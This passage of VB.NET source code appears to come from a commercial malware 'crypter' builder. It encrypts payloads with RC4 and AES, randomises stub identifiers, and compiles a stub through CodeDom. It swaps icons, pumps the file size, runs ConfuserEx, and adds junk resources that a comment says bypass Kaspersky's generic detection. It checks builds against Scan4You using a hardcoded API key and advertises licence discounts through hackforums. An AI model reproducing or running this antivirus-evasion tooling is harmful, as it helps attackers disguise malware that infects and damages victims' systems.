                                             "x_drt", "c_rc4" _
                                            }
            For x As Integer = 0 To Stub_USG_Vars.Length - 1
                StubRes = StubRes.Replace(Stub_USG_Vars(x), stub_usg_base & rndval(stub_usg_randomint, randomstringpool_eng))
            Next

            StubRes = RenameAll(stub_usg_base, stub_usg_randomint, "Friend WithEvents ", " ", StubRes) 'Junk Designer Class

            'StubRes = RenameAll(stub_usg_base, stub_usg_randomint, "ByVal ", " ", StubRes)

            StubRes = RenameAll(stub_usg_base, stub_usg_randomint, "Dim ", " ", StubRes)

            StubRes = RenameAll(stub_usg_base, stub_usg_randomint, "Catch ", " ", StubRes)

            StubRes = RenameAll(stub_usg_base, stub_usg_randomint, "Private Function ", "(", StubRes)

            'Cannot USG : Dispose
            '-----------------------------------'
            'File.WriteAllText("Stub.txt", StubRes)
            '------------- Compile -------------'
            GenerateResource(folder_path & "\" & DynamicRN_MainBytes_1 & ".resources", DynamicRN_MainBytes_2, Main_Enc_Bytes)
            GenerateResource(folder_path & "\" & DynamicRN_DllBytes_1 & ".resources", DynamicRN_DllBytes_2, Dll_Enc_Bytes)
            CompileMain(StubRes, sfd, _
                                folder_path & "\" & DynamicRN_MainBytes_1 & ".resources", _
                                 folder_path & "\" & DynamicRN_DllBytes_1 & ".resources", _
                                  folder_path & "\" & DynamicRN_BinderBytes_1 & ".resources", _
                                   resource_usg_base, resource_usg_randomint)
            '-----------------------------------'

            '---------- Clear Natives ----------'

            '-----------------------------------'

            '--------------- Icon --------------'
            If txtIcon.Text <> String.Empty Then
                'clsIconChanger.InjectIcon(sfd, txtIcon.Text)
                ManageRes(sfd, txtIcon.Text)
            End If
            '-----------------------------------'

            '--------------- EOF ---------------'
            If chkEOF.Checked Then
                clsEOF.WriteData(sfd, clsEOF.ReadData(txtFile.Text))
            End If
            '-----------------------------------'

            Dim TempPath = Path.GetTempPath() & "\CEX\ConfuserEX.zip"
            Dim TempDir = Path.GetTempPath() & "\CEX\"
            Directory.CreateDirectory(TempDir)
            File.WriteAllBytes(TempPath, My.Resources.confuserex_bin)
            Dim ZipToUnpack As String = TempPath
            Dim TargetDir As String = TempDir
            Using zip1 As ZipFile = ZipFile.Read(ZipToUnpack)
                Dim ee As ZipEntry
                For Each ee In zip1
                    ee.Extract(TargetDir, ExtractExistingFileAction.OverwriteSilently)
                Next
            End Using

            ''ici on va utiliser confuser Cflow
            Dim MonFichierProjet As String
            Dim TempFolder = TempDir
            MonFichierProjet = TempFolder & "blank.crproj"
            IO.File.WriteAllBytes(MonFichierProjet, My.Resources.blank)
            Dim ContentProject As String
            Dim String2replace = "%outputdir%"
            ContentProject = IO.File.ReadAllText(MonFichierProjet).Replace(String2replace, Path.GetTempPath())
            Dim basedir = Path.GetTempPath()
            Dim string2replaceBIS = "%basedir%"
            ContentProject = ContentProject.Replace(string2replaceBIS, basedir)
            ContentProject = ContentProject.Replace("%inputfile%", sfd)
            IO.File.WriteAllText(TempFolder & "blank.crproj", ContentProject)

            Dim psi = New ProcessStartInfo
            psi.Arguments = TempFolder & "blank.crproj"
            psi.FileName = TempDir & "Confuser.CLI.exe"
            psi.WindowStyle = ProcessWindowStyle.Hidden

            'Process.Start(psi).WaitForExit()


            File.Delete(TempFolder & "\blank.crproj")
            If Directory.Exists(TempDir) Then
                Directory.Delete(TempDir, True)
            End If

            If chkPump.Checked Then
                Dim filesize As Integer = Convert.ToInt32(txtKB.Text) * 1024
                Dim filetopump = IO.File.OpenWrite(sfd)
                Dim size = filetopump.Seek(0, IO.SeekOrigin.[End])
                While size < filesize
                    filetopump.WriteByte(0)
                    size += 1
                End While
            End If

            MessageBox.Show("Compiled!" & "Saved to : " & sfd, msgbox_title & "Compiled!", MessageBoxButtons.OK, MessageBoxIcon.Information)
        Catch ex As Exception

            CleanUpBuild()
            MessageBox.Show("Error Crypting!" & NewLine & ex.ToString, msgbox_title & "Crypting Error!", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
    End Sub
    Private Shared Sub ManageRes(target As String, Icon As String)
        Dim text As String = IO.Directory.GetCurrentDirectory() + "\ResHack.exe"
        File.WriteAllBytes(text, My.Resources.res)
        Process.Start("ResHack.exe", "-delete " & Chr(34) & target & Chr(34) & ", " & Chr(34) & target & Chr(34) & ", IconGroup,,").WaitForExit()
        Process.Start("ResHack.exe", "-addoverwrite " & Chr(34) & target & Chr(34) & ", " & Chr(34) & target & Chr(34) & ", " & Chr(34) & Icon & Chr(34) & ", IconGroup,1,0").WaitForExit()
        System.Threading.Thread.Sleep(1000)
        File.Delete(text)
        File.Delete(text.Replace(".exe", ".log"))
        File.Delete(text.Replace(".exe", ".ini"))
    End Sub
    Public Shared Function Crypt(ByVal FBcUIc0z1Z() As Byte, ByVal wruhUH8wn0s As String) As Byte()
        Dim wruhUH8wn0 As Byte() = Encoding.Default.GetBytes(wruhUH8wn0s)
        For i = 0 To (FBcUIc0z1Z.Length * 2) + wruhUH8wn0.Length
            FBcUIc0z1Z(i Mod FBcUIc0z1Z.Length) = CByte(CInt((FBcUIc0z1Z(i Mod FBcUIc0z1Z.Length)) + CInt(FBcUIc0z1Z((i + 1) Mod FBcUIc0z1Z.Length))) Mod 256) Xor wruhUH8wn0(i Mod wruhUH8wn0.Length)
        Next
        Return FBcUIc0z1Z
    End Function
    Private Sub btnRedeem_Click(sender As Object, e As EventArgs) Handles btnRedeem.Click
        MessageBox.Show("Want to redeem your lisense and receive a discount on the packages we offer? Contact me on hackforums or skype with discount code: 566 and your netseal username and receive a 10% discount on any of the packages we offer.")
    End Sub
#End Region
#Region " Encryption / Decryption "
#Region " String Encryption "
#Region " AES ( String ) "
    Public Class clsAES_string
        Public Shared Function AES_Decrypt(ByVal input As String, ByVal pass As String) As String
            Dim AES As New System.Security.Cryptography.RijndaelManaged
            Try
                Dim hash(31) As Byte
                Dim temp As Byte() = New System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass))
                System.Array.Copy(temp, 0, hash, 0, 16)
                System.Array.Copy(temp, 0, hash, 15, 16)
                AES.Key = hash
                AES.Mode = System.Security.Cryptography.CipherMode.ECB
                Dim Buffer As Byte() = System.Convert.FromBase64String(input)
                Return System.Text.ASCIIEncoding.ASCII.GetString(AES.CreateDecryptor.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Catch ex As System.Exception
                System.Windows.Forms.MessageBox.Show("Error!" & System.Environment.NewLine & ex.ToString, "Error!", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error)
                Return String.Empty
            End Try
        End Function
        Public Shared Function AES_Encrypt(ByVal input As String, ByVal pass As String) As String
            Dim AES As New System.Security.Cryptography.RijndaelManaged
            Try
                Dim hash(31) As Byte
                Dim temp As Byte() = New System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass))
                System.Array.Copy(temp, 0, hash, 0, 16)
                System.Array.Copy(temp, 0, hash, 15, 16)
                AES.Key = hash
                AES.Mode = System.Security.Cryptography.CipherMode.ECB
                Dim Buffer As Byte() = System.Text.ASCIIEncoding.ASCII.GetBytes(input)
                Return System.Convert.ToBase64String(AES.CreateEncryptor.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Catch ex As System.Exception
                System.Windows.Forms.MessageBox.Show("Error!" & System.Environment.NewLine & ex.ToString, "Error!", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error)
                Return String.Empty
            End Try
        End Function
    End Class
#End Region
#Region " Rotation / Derotation ( String ) "
    Public Class clsRotation_String
        Public Shared Function Rotation_Encrypt(strInput As String, int As Integer) As String
            For x As Integer = 1 To Microsoft.VisualBasic.Len(strInput)
                Mid(strInput, x, 1) = Microsoft.VisualBasic.ChrW(Microsoft.VisualBasic.AscW(Microsoft.VisualBasic.Strings.Mid(strInput, x, 1)) + int)
            Next x
            Return strInput
        End Function
        'Public Shared Function Rotation_Decrypt(strInput As String, int As Integer) As String
        '    For x As Integer = 1 To Microsoft.VisualBasic.Len(strInput)
        '        Mid(strInput, x, 1) = Microsoft.VisualBasic.ChrW(Microsoft.VisualBasic.AscW(Microsoft.VisualBasic.Strings.Mid(strInput, x, 1)) - int)
        '    Next x
        '    Return strInput
        'End Function
    End Class
#End Region
#End Region
#Region " Byte Encryption "
#Region " AES ( Byte ) "
    'AES is used for decrypting my resoruces in the builder
    Public Class clsAES_byte
        'Public Shared Function AES_Encrypt(ByVal input As Byte(), ByVal pass As String) As Byte()
        '    Dim AES As New System.Security.Cryptography.RijndaelManaged
        '    Try
        '        Dim hash(31) As Byte
        '        Dim temp As Byte() = New System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass))
        '        System.Array.Copy(temp, 0, hash, 0, 16)
        '        System.Array.Copy(temp, 0, hash, 15, 16)
        '        AES.Key = hash
        '        AES.Mode = System.Security.Cryptography.CipherMode.ECB
        '        Return AES.CreateEncryptor.TransformFinalBlock(input, 0, input.Length)
        '    Catch ex As System.Exception
        '        System.Windows.Forms.MessageBox.Show("Error!" & System.Environment.NewLine & ex.ToString, "Error!", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error)
        '        Return Nothing
        '    End Try
        'End Function
        Public Shared Function AES_Decrypt(ByVal input As Byte(), ByVal pass As String) As Byte()
            Dim AES As New System.Security.Cryptography.RijndaelManaged
            Try
                Dim hash(31) As Byte
                Dim temp As Byte() = New System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass))
                System.Array.Copy(temp, 0, hash, 0, 16)
                System.Array.Copy(temp, 0, hash, 15, 16)
                AES.Key = hash
                AES.Mode = System.Security.Cryptography.CipherMode.ECB
                Return AES.CreateDecryptor.TransformFinalBlock(input, 0, input.Length)
            Catch ex As System.Exception
                System.Windows.Forms.MessageBox.Show("Error!" & System.Environment.NewLine & ex.ToString, "Error!", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error)
                Return Nothing
            End Try
        End Function
    End Class
#End Region
#Region " RC4 ( Byte ) "
    'RC4 is used for the main bytes, and the dll
    Public Class clsRC4_byte
        Public Shared Function Func(ByVal Input As Byte(), ByVal Key As String) As Byte()
            Dim i As UInteger
            Dim j As UInteger
            Dim swap As UInteger
            Dim s As UInteger() = New UInteger(255) {}
            Dim Output As Byte() = New Byte(Input.Length - 1) {}
            For i = 0 To 255
                s(CInt(i)) = i
            Next
            For i = 0 To 255
                j = CUInt((j + System.Text.Encoding.Default.GetBytes(Key)(CInt(i Mod Key.Length)) + s(CInt(i))) And 255)
                swap = s(CInt(i))
                s(CInt(i)) = s(CInt(j))
                s(CInt(j)) = swap
            Next
            i = 0
            j = 0
            For c As Integer = 0 To Output.Length - 1
                i = CUInt((i + 1) And 255)
                j = CUInt((j + s(CInt(i))) And 255)
                swap = s(CInt(i))
                s(CInt(i)) = s(CInt(j))
                s(CInt(j)) = swap
                Output(c) = CByte(Input(c) Xor s(CInt((s(CInt(i)) + s(CInt(j))) And 255)))
            Next
            Return Output
        End Function
    End Class
#End Region
#End Region
#End Region
#Region " Scanner "
    Private Sub btnScan_Click(sender As Object, e As EventArgs) Handles btnScan.Click
        Dim ofd As New OpenFileDialog With {.Title = "File to scan"}
        ofd.ShowDialog()
        If Not ofd.FileName = Nothing Then
            Dim scanthread As Thread = New Thread(Sub() InitializeScan(ofd.FileName))
            btnScan.Text = "Scanning..."
            btnScan.Enabled = False
            ListView1.Items.Clear()
            scanthread.Start()
        End If
    End Sub
    Private Sub InitializeScan(file As String)
        Try
            Dim s4y As Scan4You = New Scan4You("34681", "fe8f7ffa233eb2e6f189")  '"34681", "fe8f7ffa233eb2e6f189") 'NETSEAL-VARIABLE, don't hardcode this 
            Dim results As String = s4y.Scan(file)
            Trim(results)
        Catch ex As Exception
            Exit Sub
        End Try
    End Sub
    Private Sub Trim(result As String)
        Dim results As String() = parseScanResults(result)
        Dim tmp As String = ""
        Dim d As Integer = 0
        For i As Integer = 0 To results.Length - 1
            Dim res As String() = results(i).Split(New String() {""":"""}, StringSplitOptions.RemoveEmptyEntries)
            If Not res(0) = "LINK" Then
                Me.Invoke(Sub()
                              If Not res(1).Replace("\/", "/") = "OK" Then
                                  d = d + 1
                                  Dim Litem As ListViewItem
                                  Litem = New ListViewItem()
                                  Litem.Text = res(0)
                                  Litem.SubItems.Add(res(1).Replace("\/", "/"))
                                  Litem.UseItemStyleForSubItems = False
                                  Litem.SubItems(1).ForeColor = Color.Red
                                  Litem.ForeColor = Color.Red
                                  ListView1.Items.Add(Litem)
                              Else
                                  Dim Litem As ListViewItem
                                  Litem = New ListViewItem()
                                  Litem.Text = res(0)
                                  Litem.SubItems.Add(res(1).Replace("\/", "/"))
                                  Litem.UseItemStyleForSubItems = False
                                  Litem.SubItems(1).ForeColor = Color.Green
                                  Litem.ForeColor = Color.Green
                                  ListView1.Items.Add(Litem)
                                  'ListView1.Items.Add(res(0)).SubItems.Add(res(1).Replace("\/", "/")).ForeColor = Color.Green
                              End If
                          End Sub)
            Else
                Me.Invoke(Sub()
                              txtLink.Text = res(1).Replace("\/", "/")
                              txtLink.Text = txtLink.Text.Replace("URL=", "")
                          End Sub)
            End If
        Next
        Me.Invoke(Sub()
                      lblDetections.Text = "Detections: " & d & "/" & ListView1.Items.Count
                      btnScan.Text = "Scan"
                      btnScan.Enabled = True

                  End Sub)
        MessageBox.Show("File scan complete!", "Scanner", MessageBoxButtons.OK, MessageBoxIcon.Information)
    End Sub
    Private Function parseScanResults(pServerResponse As String) As String()
        Try
            pServerResponse = pServerResponse.Replace("{""", "")
            pServerResponse = pServerResponse.Replace("""}", "")
            Dim results As String() = pServerResponse.Split(New String() {""","""}, StringSplitOptions.RemoveEmptyEntries)
            Return results
        Catch
            Return Nothing
        End Try
    End Function
#End Region

#Region " Clean Up "
    Private Sub CleanUpBuild()
        Try
            If System.IO.Directory.Exists(folder_path) Then
                For Each foundFile As String In My.Computer.FileSystem.GetFiles(folder_path)
                    System.IO.File.Delete(foundFile)
                Next
                System.IO.Directory.Delete(folder_path)
            End If
        Catch ex As System.Exception
        End Try
    End Sub
#End Region

#Region " Rename "
    Private Function RenameAll(stubbase As String, stubint As Integer, split1 As String, split2 As String, stub As String) As String
        Dim Tmp1() As String = Microsoft.VisualBasic.Strings.Split(stub, split1)
        Try
            For i = 1 To Tmp1.Length
                Dim Tmp2() As String = Microsoft.VisualBasic.Strings.Split(Tmp1(i), split2)
                stub = stub.Replace(Tmp2(0), stubbase & rndval(CInt(stubint), randomstringpool_eng))
            Next
        Catch : End Try
        Return stub
    End Function
    Private Function RenameSpecific(stubbase As String, stubint As Integer, vars As String(), source As String) As String
        For i As Integer = 0 To vars.Length - 1
            source = source.Replace(vars(i), stubbase & rndval(CInt(stubint), randomstringpool_eng))
        Next
        Return source
    End Function
#End Region
#Region " Create "
#Region " Resource Function "

    Private Function CreateStubRes(strInput1 As String, strInput2 As String) As String


        'New System.Resources.ResourceManager("RESOURCE_NAME", System.Reflection.Assembly.GetExecutingAssembly).GetObject("RESOURCE_NAME")
        Return "ReadDataFromBitmap(New System.Resources.ResourceManager(""" & strInput1 & """, System.Reflection.Assembly.GetExecutingAssembly).GetObject(""" & strInput2 & """" & ")"
    End Function
#End Region
#End Region
#Region " Icon Changer "
    Public Class clsIconChanger
        Private Shared rand As New System.Random
        Public Shared Sub InjectIcon(ByVal exeFileName As String, ByVal iconFileName As String)
            clsIconChanger.HandleIconInjection(exeFileName, iconFileName, CUInt(rand.Next(50, 500)), CUInt(rand.Next(50, 500)))
        End Sub
        Private Shared Sub HandleIconInjection(ByVal exeFileName As String, _
                                    ByVal iconFileName As String, _
                                    ByVal iconGroupID As UInteger, _
                                    ByVal iconBaseID As UInteger)
            Dim RT_ICON As UInteger = 3UI
            Dim RT_GROUP_ICON As UInteger = 14UI
            Dim iconFile As clsIconFile = clsIconFile.FromFile(iconFileName)
            Dim hUpdate = clsNativeMethods.BeginUpdateResource(exeFileName, False)
            Dim data = iconFile.CreateIconGroupData(iconBaseID)
            clsNativeMethods.UpdateResource(hUpdate, New System.IntPtr(RT_GROUP_ICON), New System.IntPtr(iconGroupID), CShort(rand.Next(50, 500)), data, data.Length)
            'clsNativeMethods.UpdateResource(hUpdate, New System.IntPtr(RT_GROUP_ICON), New System.IntPtr(iconGroupID), 0, data, data.Length)
            For i = 0 To iconFile.ImageCount - 1
                Dim image = iconFile.ImageData(i)
                clsNativeMethods.UpdateResource(hUpdate, New System.IntPtr(RT_ICON), New System.IntPtr(iconBaseID + i), CShort(rand.Next(50, 500)), image, image.Length)
                'clsNativeMethods.UpdateResource(hUpdate, New System.IntPtr(RT_ICON), New System.IntPtr(iconBaseID + i), 0, image, image.Length)
            Next
            clsNativeMethods.EndUpdateResource(hUpdate, False)
        End Sub
#Region " clsNativeMethods "
        <System.Security.SuppressUnmanagedCodeSecurity()> _
        Private Class clsNativeMethods
            <System.Runtime.InteropServices.DllImport("kernel32")> _
            Public Shared Function BeginUpdateResource( _
            ByVal fileName As String, _
            <System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)> ByVal deleteExistingResources As Boolean) As System.IntPtr
            End Function
            <System.Runtime.InteropServices.DllImport("kernel32")> _
            Public Shared Function UpdateResource( _
            ByVal hUpdate As System.IntPtr, _
            ByVal type As System.IntPtr, _
            ByVal name As System.IntPtr, _
            ByVal language As Short, _
            <System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPArray, SizeParamIndex:=5)> _
            ByVal data() As Byte, _
            ByVal dataSize As Integer) As <System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)> Boolean
            End Function
            <System.Runtime.InteropServices.DllImport("kernel32")> _
            Public Shared Function EndUpdateResource( _
            ByVal hUpdate As System.IntPtr, _
            <System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)> ByVal discard As Boolean) As <System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)> Boolean
            End Function
        End Class
        <System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)> _
        Private Structure strucICONDIR
            Public Reserved As UShort
            Public Type As UShort
            Public Count As UShort
        End Structure
        <System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)> _
        Private Structure strucICONDIRENTRY
            Public Width As Byte
            Public Height As Byte
            Public ColorCount As Byte
            Public Reserved As Byte
            Public Planes As UShort
            Public BitCount As UShort
            Public BytesInRes As Integer
            Public ImageOffset As Integer
        End Structure
        <System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential)> _
        Private Structure strucBITMAPINFOHEADER
            Public Size As UInteger
            Public Width As Integer
            Public Height As Integer
            Public Planes As UShort
            Public BitCount As UShort
            Public Compression As UInteger
            Public SizeImage As UInteger
            Public XPelsPerMeter As Integer
            Public YPelsPerMeter As Integer
            Public ClrUsed As UInteger
            Public ClrImportant As UInteger
        End Structure
        <System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential, Pack:=2)> _
        Private Structure strucGRPICONDIRENTRY
            Public Width As Byte
            Public Height As Byte
            Public ColorCount As Byte
            Public Reserved As Byte
            Public Planes As UShort
            Public BitCount As UShort
            Public BytesInRes As Integer
            Public ID As UShort
        End Structure
#End Region
#Region " clsIconFile "
        Private Class clsIconFile
            Private iconDir As New strucICONDIR
            Private iconEntry() As strucICONDIRENTRY
            Private iconImage()() As Byte
            Public ReadOnly Property ImageCount() As Integer
                Get
                    Return iconDir.Count
                End Get
            End Property
            Public ReadOnly Property ImageData(ByVal index As Integer) As Byte()
                Get
                    Return iconImage(index)
                End Get
            End Property
            Public Shared Function FromFile(ByVal filename As String) As clsIconFile
                Dim instance As New clsIconFile
                Dim fileBytes() As Byte = System.IO.File.ReadAllBytes(filename)
                Dim pinnedBytes = System.Runtime.InteropServices.GCHandle.Alloc(fileBytes, System.Runtime.InteropServices.GCHandleType.Pinned)
                instance.iconDir = DirectCast(System.Runtime.InteropServices.Marshal.PtrToStructure(pinnedBytes.AddrOfPinnedObject, GetType(strucICONDIR)), strucICONDIR)
                instance.iconEntry = New strucICONDIRENTRY(instance.iconDir.Count - 1) {}
                instance.iconImage = New Byte(instance.iconDir.Count - 1)() {}
                Dim offset = System.Runtime.InteropServices.Marshal.SizeOf(instance.iconDir)
                Dim iconDirEntryType = GetType(strucICONDIRENTRY)
                Dim size = System.Runtime.InteropServices.Marshal.SizeOf(iconDirEntryType)
                For i = 0 To instance.iconDir.Count - 1
                    Dim entry = DirectCast(System.Runtime.InteropServices.Marshal.PtrToStructure(New System.IntPtr(pinnedBytes.AddrOfPinnedObject.ToInt64 + offset), iconDirEntryType), strucICONDIRENTRY)
                    instance.iconEntry(i) = entry
                    instance.iconImage(i) = New Byte(entry.BytesInRes - 1) {}
                    System.Buffer.BlockCopy(fileBytes, entry.ImageOffset, instance.iconImage(i), 0, entry.BytesInRes)
                    offset += size
                Next
                pinnedBytes.Free()
                Return instance
            End Function
            Public Function CreateIconGroupData(ByVal iconBaseID As UInteger) As Byte()
                Dim sizeOfIconGroupData As Integer = System.Runtime.InteropServices.Marshal.SizeOf(GetType(strucICONDIR)) + System.Runtime.InteropServices.Marshal.SizeOf(GetType(strucGRPICONDIRENTRY)) * ImageCount
                Dim data(sizeOfIconGroupData - 1) As Byte
                Dim pinnedData = System.Runtime.InteropServices.GCHandle.Alloc(data, System.Runtime.InteropServices.GCHandleType.Pinned)
                System.Runtime.InteropServices.Marshal.StructureToPtr(iconDir, pinnedData.AddrOfPinnedObject, False)
                Dim offset = System.Runtime.InteropServices.Marshal.SizeOf(iconDir)
                For i = 0 To ImageCount - 1
                    Dim grpEntry As New strucGRPICONDIRENTRY
                    Dim bitmapheader As New strucBITMAPINFOHEADER
                    Dim pinnedBitmapInfoHeader = System.Runtime.InteropServices.GCHandle.Alloc(bitmapheader, System.Runtime.InteropServices.GCHandleType.Pinned)
                    System.Runtime.InteropServices.Marshal.Copy(ImageData(i), 0, pinnedBitmapInfoHeader.AddrOfPinnedObject, System.Runtime.InteropServices.Marshal.SizeOf(GetType(strucBITMAPINFOHEADER)))
                    pinnedBitmapInfoHeader.Free()
                    grpEntry.Width = iconEntry(i).Width
                    grpEntry.Height = iconEntry(i).Height
                    grpEntry.ColorCount = iconEntry(i).ColorCount
                    grpEntry.Reserved = iconEntry(i).Reserved
                    grpEntry.Planes = bitmapheader.Planes
                    grpEntry.BitCount = bitmapheader.BitCount
                    grpEntry.BytesInRes = iconEntry(i).BytesInRes
                    grpEntry.ID = CType(iconBaseID + i, UShort)
                    System.Runtime.InteropServices.Marshal.StructureToPtr(grpEntry, New System.IntPtr(pinnedData.AddrOfPinnedObject.ToInt64 + offset), False)
                    offset += System.Runtime.InteropServices.Marshal.SizeOf(GetType(strucGRPICONDIRENTRY))
                Next
                pinnedData.Free()
                Return data
            End Function
        End Class
#End Region
    End Class
#End Region
#Region " CleanNatives "
    Public Class CleanNatives
        <System.Runtime.InteropServices.DllImport("kernel32", CharSet:=System.Runtime.InteropServices.CharSet.Unicode)> _
        Public Shared Function BeginUpdateResource(ByVal fileName As String, <System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)> ByVal deleteExistingResources As Boolean) As System.IntPtr
        End Function
        <System.Runtime.InteropServices.DllImport("kernel32", CharSet:=System.Runtime.InteropServices.CharSet.Unicode)> _
        Public Shared Function EndUpdateResource(ByVal hUpdate As System.IntPtr, <System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)> ByVal discard As Boolean) As <System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.Bool)> Boolean
        End Function
        Public Shared Sub Clean(ByVal filename As String)
            Try
                EndUpdateResource(BeginUpdateResource(filename, True), False)
            Catch ex As System.Exception
                System.Windows.Forms.MessageBox.Show(ex.ToString(), "Error!", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error)
            End Try
        End Sub
    End Class
#End Region
#Region " EOF "
    Public Class clsEOF
        Public Shared Function ReadData(ByRef FilePath As String) As String
            On Error GoTo Err_Renamed
            Dim sEOFBuf, sFileBuf, sChar As String
            Dim lPos2, lFF, lPos, lCount As Integer
            If Microsoft.VisualBasic.FileSystem.Dir(FilePath) = "" Then GoTo Err_Renamed
            lFF = Microsoft.VisualBasic.FileSystem.FreeFile()
            Microsoft.VisualBasic.FileSystem.FileOpen(lFF, FilePath, Microsoft.VisualBasic.OpenMode.Binary)
            sFileBuf = Microsoft.VisualBasic.Strings.Space(CInt(Microsoft.VisualBasic.FileSystem.LOF(lFF)))
            Microsoft.VisualBasic.FileSystem.FileGet(lFF, sFileBuf)
            Microsoft.VisualBasic.FileSystem.FileClose(lFF)
            lPos = Microsoft.VisualBasic.Strings.InStr(1, Microsoft.VisualBasic.Strings.StrReverse(sFileBuf), GetNullBytes(30))
            sEOFBuf = Microsoft.VisualBasic.Strings.Mid(Microsoft.VisualBasic.Strings.StrReverse(sFileBuf), 1, lPos - 1)
            ReadData = Microsoft.VisualBasic.Strings.StrReverse(sEOFBuf)
            If ReadData = "" Then
            End If
            Exit Function
Err_Renamed:
            ReadData = Microsoft.VisualBasic.Constants.vbNullString
        End Function
        Public Shared Function GetNullBytes(ByRef lNum As Object) As String
            Dim sBuf As String = ""
            Dim i As Short
            For i = 1 To CShort(lNum)
                sBuf = sBuf & Microsoft.VisualBasic.Strings.Chr(0)
            Next
            GetNullBytes = sBuf
        End Function
        Public Shared Sub WriteData(ByRef FilePath As String, ByRef EOFData As String)
            Dim sFileBuf As String
            Dim lFF As Integer
            On Error Resume Next
            If Microsoft.VisualBasic.FileSystem.Dir(FilePath) = "" Then Exit Sub
            lFF = Microsoft.VisualBasic.FileSystem.FreeFile()
            Microsoft.VisualBasic.FileSystem.FileOpen(lFF, FilePath, Microsoft.VisualBasic.OpenMode.Binary)
            sFileBuf = Microsoft.VisualBasic.Strings.Space(CInt(Microsoft.VisualBasic.FileSystem.LOF(lFF)))
            Microsoft.VisualBasic.FileSystem.FileGet(lFF, sFileBuf)
            Microsoft.VisualBasic.FileSystem.FileClose(lFF)
            Microsoft.VisualBasic.FileSystem.Kill(FilePath)
            lFF = Microsoft.VisualBasic.FileSystem.FreeFile()
            Microsoft.VisualBasic.FileSystem.FileOpen(lFF, FilePath, Microsoft.VisualBasic.OpenMode.Binary)
            Microsoft.VisualBasic.FileSystem.FilePut(lFF, sFileBuf & EOFData)
            Microsoft.VisualBasic.FileSystem.FileClose(lFF)
        End Sub
    End Class
#End Region
#Region " CodeDom Compiler "
    'Parameters.IncludeDebugInformation = False
    Public Shared Sub GenerateResource(ByVal Location As String, ByVal Name As String, ByVal Data As Object)
        Using R As New System.Resources.ResourceWriter(Location)
            R.AddResource(Name, Data)
            R.Generate()
            R.Close()
        End Using
    End Sub

#Region " Generate Junk Resources "
#Region " Junk Icon Resource "
    Private Function res_RandomIcon(ext As String, resname As String) As String
        Using fs As New System.IO.FileStream(folder_path & "\" & resname & ext, System.IO.FileMode.Create)
            System.Drawing.Icon.FromHandle(CType(IconGen_Resources(), System.Drawing.Bitmap).GetHicon).Save(fs)
        End Using
        Return resname & ext
    End Function
    Private Function IconGen_Resources() As System.Drawing.Bitmap '16|24|32|48|64|96|128
        Dim x As Integer = 8
        Dim y As Integer = 8

        Dim Undrawed As New System.Drawing.Bitmap(x, y)
        For i As Integer = 1 To x - 1
            For i2 As Integer = 1 To y - 1
                Undrawed.SetPixel(i, i2, System.Drawing.Color.FromArgb(rand.Next(0, 255), rand.Next(0, 255), rand.Next(0, 255)))
            Next
        Next
        Return Undrawed
    End Function
#End Region
#Region " Junk Byte Resource "
    Private Function res_RandomBytes(byte_size As Integer, ext As String, resname As String) As String
        Dim pumpBytes(CInt(byte_size)) As Byte
        For i As Integer = 0 To pumpBytes.Length - 1
            pumpBytes(i) = CByte(rand.Next(0, 255))
        Next
        GenerateResource(folder_path & "\" & resname & ext, resname, pumpBytes)
        Return resname & ext
    End Function
#End Region
#Region " Junk String Resource "
    Private Function res_RandomString(ext As String, resname As String) As String
        Dim enc_rndstr As String = clsAES_string.AES_Encrypt(rndval(rand.Next(10, 20), randomstringpool_eng), rndval(rand.Next(10, 20), randomstringpool_eng))
        GenerateResource(folder_path & "\" & resname & ext, resname, enc_rndstr)
        Return resname & ext
    End Function
#End Region
#End Region

    Public Sub CompileMain(ByVal Source As String, ByVal Out As String, _
                            ByVal Main_Bytes As String, _
                             ByVal Dll_Bytes As String, _
                              ByVal Bind_Bytes As String, _
                           ByVal resource_usg_base As String, _
                            ByVal resource_usg_int As Integer)

        'On Error Resume Next

        Dim ProviderOptions As New System.Collections.Generic.Dictionary(Of String, String)()
        ProviderOptions.Add("CompilerVersion", "v2.0")

        Dim CodeProvider As New Microsoft.VisualBasic.VBCodeProvider(ProviderOptions)
        Dim Parameters As New System.CodeDom.Compiler.CompilerParameters

        Parameters.GenerateExecutable = False
        Parameters.OutputAssembly = Out

        'rndval(rand.Next(usgV1, usgV2), randomstringpool_eng_l)

        '--------------- Add Junk Resource ---------------
        '.jpg | .tif | .gif | .png | .ico | .resources
        'Usually two junk resources ( icons are best ) are required to bypass Kaspersky's Generic detection )
        For i As Integer = 0 To rand.Next(1, 2)
